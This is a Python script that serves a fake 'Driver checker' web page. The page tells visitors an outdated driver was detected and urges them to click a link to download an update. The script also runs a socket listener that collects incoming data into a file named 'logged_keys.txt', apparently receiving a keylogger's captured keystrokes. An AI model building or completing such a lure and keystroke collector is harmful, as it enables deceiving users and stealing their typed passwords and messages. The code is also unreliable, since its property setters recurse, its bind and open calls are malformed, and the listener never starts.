from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import socket


hostName = "localhost"
serverPort = 80

listeningPort = 8080

class WebServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("<html><head><title>Database</title> <style>body {    background-color: #151515;  }    * {    font-family: 'Roboto', sans-serif;      }  a{    text-decoration: none;    color: inherit;  }  p{    color: #61CA87;    font-size: 2vw;  }  h1{    color: #61CA87;    text-transform: uppercase;  }  h2{    font-size: 3vw;  }  .container {    margin: 0 auto;    max-width: 50%;  }    header {    text-align: center;    color: white;  }  footer ul{    list-style-type: none;    margin: 0;    padding: 0;    overflow: hidden;    display: grid;  }    main {    padding: 50px;    color: white;    text-align: center;  }    footer {    background-color: #21482f;    color: white;    text-align: center;    padding: 20px;  }    @media (max-width: 600px) {    .container {      margin: 0 auto;      max-width: 100%;    }    main {      padding: 20px;    }    }  </style></head>", "utf-8"))
        self.wfile.write(bytes('<!DOCTYPE html><html>  <head><link rel="stylesheet" type="text/css" href="template.css">    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">  </head>  <body>    <div class="container">      <header>        <h1>Driver checker</h1>      </header>      <main>        <h2>Outdated driver detected!</h2>        <a href="#"><p>Click here to download an update</p></a>      </main>      <footer>        <ul>            <li>                Copyright © <script>document.write(new Date().getFullYear())</script> DriverChecker            </li>        </ul>      </footer>    </div>  </body></html>', "ISO-8859-1"))

def startServer():
    try:
        webServer = HTTPServer((hostName, serverPort), WebServer)
        print(f"Sever running on {hostName} and port {serverPort}")
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        print("\nClosing server")
        webServer.server_close()


class Server:
    def __init__(self, port):
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def port(self):
        return self.port

    @port.setter
    def port(self, new_port):
        self.port = new_port

    @property
    def socket(self):
        return self.socket
    
    def initialize(self):
        try:
            self.socket.bind('localhost', self.port)
            self.socket.listen()
            logging.debug("Listening server successfully initialized!")
        except socket.error:
            print("There was an error while creating the listening server")
    
    def get_keys(self):
        connection, adress = self.socket.accept()
        with connection:
            print(f"Successfully established connection with {adress}")

        while True:
            data = connection.recv(1024)
            if not data:
                break
            logging.info(data)
            for data in data:
                with open('logged_keys.txt' 'w') as logged_keys:
                    logged_keys.write(data)
                    

if __name__ == "__main__":
    startServer()

    server = Server(listeningPort)
    server.get_keys()